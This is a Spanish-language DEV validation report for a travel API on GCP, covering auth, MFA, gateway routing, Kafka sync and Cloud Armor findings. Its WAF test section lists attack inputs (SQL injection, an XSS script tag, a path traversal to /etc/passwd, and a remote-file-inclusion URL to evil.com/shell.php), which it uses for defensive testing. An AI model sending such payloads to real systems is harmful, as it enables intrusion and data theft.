# Reporte de Validación DEV — 2026-04-25

Ejecutado contra el ambiente DEV de GCP (`gen-lang-client-0930444414`).

## Resumen ejecutivo

| Capa | Estado | Notas |
|---|---|---|
| Health (5 superficies) | ✅ | LB, gateway, 3 Cloud Run responden 200 |
| JWKS | ✅ | RS256, kid `travelhub-key-1` |
| Auth público (register/login/refresh) | ✅ | Flujo completo OK; refresh rechaza access tokens (401) |
| Auth protegido (`/me` GET y PUT) | ✅ | JWT validado por gateway → backend con `X-Forwarded-Authorization` |
| MFA (setup/verify/login) | ✅ | TOTP activado, 428 sin código, login con MFA setea `mfa_verified=true` |
| PMS Integration end-to-end | ✅ resuelto 2026-04-26 | Gateway rutea `/api/v1/pms/*` correctamente (config `travelhub-config-20260426-pms-fix`) |
| PMS Sync (Kafka → worker → DB) | ✅ | Worker consume y actualiza `sync_events.status` con `processed_at` |
| Idempotencia webhook | ✅ | Reenvío del mismo `event_id` no re-procesa |
| Gateway JWT validation | ✅ | 401 sin token, 401 mal formado, 401 firma alterada, 403 audience inválida |
| Cloud Armor WAF | ❌ ver hallazgo #2 | Reglas SQLi/XSS/LFI/RFI **no desplegadas** |
| Cloud Armor rate limit | ⚠️ ver hallazgo #3 | Configurado como `throttle` (delay), no `deny` → no devuelve 429 |

## Detalle de pruebas ejecutadas

### 1. Health (5/5 OK)

```
GET https://apitravelhub.site/health                                        → 200
GET https://travelhub-gateway-1yvtqj7r.uc.gateway.dev/health                → 200
GET https://user-services-ridyy4wz4q-uc.a.run.app/health                    → 200
GET https://pms-integration-services-ridyy4wz4q-uc.a.run.app/health         → 200 (db: ok, kafka: ok)
GET https://pms-sync-worker-ridyy4wz4q-uc.a.run.app/health                  → 200
```

### 2. Auth flow (vía LB → Cloud Armor → Gateway → user-services)

```
POST /api/v1/auth/register   → 201   (rol viajero, mfa_activo=false)
POST /api/v1/auth/login      → 200   (access+refresh con kid=travelhub-key-1)
GET  /api/v1/auth/me         → 200   (perfil completo, sin hashed_password)
PUT  /api/v1/auth/me         → 200   (nombre y telefono actualizados)
POST /api/v1/auth/refresh    → 200   (par renovado)
POST /api/v1/auth/refresh    → 401   (con access_token: "Se esperaba un refresh token")
```

JWT decodificado:
```json
{
  "sub": "2476bcb2-...", "role": "traveler", "mfa_verified": false,
  "country": "CO", "type": "access",
  "iss": "https://auth.travelhub.app", "aud": "travelhub-api"
}
```

### 3. MFA flow

```
POST /api/v1/auth/mfa/setup   → 200   (secret base32 32-chars, qr_uri)
POST /api/v1/auth/mfa/verify  → 200   ("MFA activado exitosamente")
POST /api/v1/auth/login (sin TOTP)    → 428   ("Código MFA requerido")
POST /api/v1/auth/login (con TOTP)    → 200   (mfa_verified=true en JWT)
```

### 4. PMS Integration

Vía gateway (`apitravelhub.site` y `travelhub-gateway-*`):
```
GET /api/v1/pms/availability  → 404 ❌ (gateway sin ruta — placeholder)
GET /api/v1/pms/properties    → 404 ❌
```

Vía Cloud Run directo (`pms-integration-services-ridyy4wz4q`):
```
GET /api/v1/pms/availability   → 200  (lista vacía)
GET /api/v1/pms/properties (traveler)  → 403 (RBAC backend OK)
GET /api/v1/pms/properties (admin)     → 200 (devuelve HB-DEV-001)
POST /api/v1/pms/webhook (admin)       → 202 (status: queued)
POST /api/v1/pms/webhook (mismo event_id)  → 202 (idempotencia OK)
GET /api/v1/pms/sync-status/{id}       → 200 (status: failed, processed_at presente)
```

El sync-worker procesó el mensaje (Kafka in/out OK). Status `failed` es esperado: la propiedad de prueba no tiene mapping de room_id en BD.

### 5. Gateway JWT validation (4/4 OK)

```
GET /api/v1/auth/me sin Authorization              → 401 "Jwt is missing"
GET /api/v1/auth/me con "Bearer not.a.real.jwt"    → 401 "Jwt is not in the form Header.Payload.Signature"
GET /api/v1/auth/me con firma alterada             → 401 "Jwt signature is an invalid Base64url encoded"
GET /api/v1/auth/me con audience errónea           → 403 "Audiences in Jwt are not allowed"
```

Mensajes vienen del gateway, no del backend.

### 6. Cloud Armor (FAIL — ver hallazgos)

```
GET /api/v1/search/hotels?q=1' OR 1=1--             → 404 (esperado 403)
GET /api/v1/search/hotels?q=<script>alert(1)</script>  → 400 (esperado 403)
GET /api/v1/search/../../etc/passwd                  → 404 (esperado 403)
GET /api/v1/search?file=http://evil.com/shell.php   → 404 (esperado 403)

POST /api/v1/auth/login (12 reqs consecutivos)      → 401 x 12 (esperado: 429 al hit 11)
```

## Hallazgos

### #1 ✅ Gateway no rutea `/api/v1/pms/*` — **RESUELTO 2026-04-26**

**Causa raíz:** el spec compilado tenía
`pms-integration-services-PLACEHOLDER.a.run.app` en vez de la URL real.

**Fix aplicado:**
1. Actualizado `config/environments/dev.env` — añadidas URLs reales para
   `PMS_SERVICES_URL`, `SEARCH_SERVICES_URL`, `BOOKING_SERVICES_URL`.
2. Render con envsubst sobre `gateway/openapi-spec.template.yaml`.
3. Nuevo api-config bajo `travelhub-api` legacy:
   `travelhub-config-20260426-pms-fix`.
4. `gcloud api-gateway gateways update travelhub-gateway --api-config=...`
5. Snapshot `gateway/openapi-spec.yaml` actualizado.

**Validación:**
```
GET https://apitravelhub.site/api/v1/pms/availability  →  401  (antes: 404)
GET https://apitravelhub.site/api/v1/pms/properties    →  401  (antes: 404)
```

`401` = gateway encuentra ruta, rutea al backend que pide JWT (correcto).

### #2 ❌ Cloud Armor sin reglas WAF

La policy `travelhub-security-policy` está asociada al backend service
correcto (`travelhub-backend-service`), pero solo tiene 5 reglas:

| Prioridad | Acción | Función |
|---|---|---|
| 2000 | throttle | Global 500 req/min |
| 2100 | throttle | Login 10 req/min |
| 2200 | throttle | Payments 20 req/min |
| 3000 | deny(403) | Geo-blocking (LATAM + algunas) |
| default | allow | — |

**No se aplicaron las reglas 1000–1500** definidas en
`cloud-armor/security-policy.sh` (sqli-v33-stable, xss-v33-stable,
lfi-v33-stable, rfi-v33-stable, rce-stable, methodenforcement-stable).

**Fix:** ejecutar
```bash
PROJECT_ID=gen-lang-client-0930444414 bash cloud-armor/security-policy.sh
```
o agregar manualmente las reglas faltantes con
`gcloud compute security-policies rules create 1000 ...`.

### #3 ⚠️ Rate limit en `throttle`, no `deny`

Las 3 reglas de rate limit (2000/2100/2200) usan `throttle`, que **demora**
el request en lugar de rechazarlo con 429. Por eso 12 logins seguidos
devuelven 401 sin disparar 429.

**Implicación:** el atacante puede seguir intentando login (con latencia
artificial) en lugar de ser bloqueado. Esto debilita AH008.

**Fix recomendado:** cambiar action a `rate_based_ban` o `deny(429)` en
`cloud-armor/security-policy.sh` y re-aplicar:

```bash
gcloud compute security-policies rules update 2100 \
  --security-policy=travelhub-security-policy \
  --action=deny-429 \
  --project=gen-lang-client-0930444414
```

## Lo que sí funciona perfectamente

- TLS + DNS (`apitravelhub.site` resuelve a `136.110.223.156`, cert SSL válido)
- LB → Gateway → Cloud Run (rutas user-services 100% OK)
- API Gateway JWT (firma RS256, issuer, audience, header parsing)
- JWKS endpoint accesible y bien formado
- Chain of Responsibility en user-services (token → RBAC → MFA)
- RBAC en pms-integration (traveler bloqueado en /properties y /webhook)
- Idempotencia + flujo Kafka (producer publica, consumer procesa, status se actualiza)
- Health checks de DB y Kafka desde pms-integration
- Geo-blocking Cloud Armor (regla 3000) — no validado pero sí está activa

## Próximos pasos sugeridos

1. **Crítico:** actualizar `openapi-spec.yaml` y redesplegar gateway con URL real de pms-integration.
2. **Importante:** ejecutar `cloud-armor/security-policy.sh` completo para tener WAF activo.
3. **Recomendado:** cambiar acciones de rate limit de `throttle` a `deny(429)` o `rate_based_ban`.
4. **Limpieza:** eliminar las 4 policies huérfanas
   `default-security-policy-for-backend-service-test*` que no están en uso.
